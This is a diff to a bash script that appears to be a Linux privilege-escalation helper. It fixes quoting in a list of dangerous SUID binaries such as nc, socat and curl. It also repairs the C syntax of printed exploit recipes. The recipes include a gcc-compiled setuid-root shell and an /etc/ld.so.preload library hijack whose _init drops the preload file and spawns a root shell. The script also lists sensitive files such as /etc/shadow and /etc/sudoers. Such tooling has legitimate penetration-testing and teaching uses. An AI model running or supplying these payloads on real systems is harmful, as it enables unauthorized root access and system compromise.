@@ -4,7 +4,7 @@ source "$(dirname "${BASH_SOURCE[0]}")/../utils/helpers.sh"
 
 GTFOBINS_BASE_URL="https://gtfobins.github.io"
 
-SUID_DANGEROUS="nmap vim vi find bash sh zsh dash perl python python3 ruby lua awk gawk mawk gcc g++ cc make ld so ld.so ldconfig env git hg svn bzip2 gzip zip tar dd nc ncat netcat socat curl wget aria2c Links elinks fetch ftp tftp snmpwalk snmpget strace ltrace trace ldd strings
+SUID_DANGEROUS="nmap vim vi find bash sh zsh dash perl python python3 ruby lua awk gawk mawk gcc g++ cc make ld so ld.so ldconfig env git hg svn bzip2 gzip zip tar dd nc ncat netcat socat curl wget aria2c Links elinks fetch ftp tftp snmpwalk snmpget strace ltrace trace ldd strings"
 
 SUID_SENSITIVE="/etc/passwd /etc/shadow /etc/gshadow /etc/sudoers /etc/sudoers.d /etc/hosts /etc/crontab /etc/anacrontab /etc/fstab /etc/motd"
 
@@ -154,10 +154,10 @@ check_suid_exploitable() {
                     print_link "GTFOBins" "${GTFOBINS_BASE_URL}/gtfobins/ruby"
                     ;;
                 gcc)
-                    print_command "cat > /tmp/priv.c << 'EOF'"
-                    print_command "#include <unistd.h>"
-                    print_command "int main() { setuid(0); execv(\"/bin/sh\", [\"sh\", NULL]); }"
-                    print_command "EOF"
+                    print_command 'cat > /tmp/priv.c << EOF'
+                    print_command '#include <unistd.h>'
+                    print_command 'int main() { setuid(0); execv("/bin/sh", (char*[]){"sh", NULL}); }'
+                    print_command 'EOF'
                     print_command "gcc /tmp/priv.c -o /tmp/priv && /tmp/priv"
                     ;;
                 make)
@@ -246,14 +246,14 @@ check_library_hijacking() {
     print_command "# If you can write to /etc/ld.so.preload"
     print_command "echo '/tmp/malicious.so' > /etc/ld.so.preload"
     print_command "# Create malicious shared library"
-    print_command "cat > /tmp/malicious.c << 'EOF'"
-    print_command "#include <unistd.h>"
-    print_command "void _init() {"
-    print_command "    unlink(\"/etc/ld.so.preload\");"
-    print_command "    setuid(0);"
-    print_command "    execv(\"/bin/sh\", [\"sh\", NULL]);"
-    print_command "}"
-    print_command "EOF"
+    print_command 'cat > /tmp/malicious.c << EOF'
+    print_command '#include <unistd.h>'
+    print_command 'void _init() {'
+    print_command '    unlink("/etc/ld.so.preload");'
+    print_command '    setuid(0);'
+    print_command '    execv("/bin/sh", (char*[]){"sh", NULL});'
+    print_command '}'
+    print_command 'EOF'
     print_command "gcc -fPIC -shared -o /tmp/malicious.so /tmp/malicious.c"
     print_command "sudo $any_suid_binary"
     
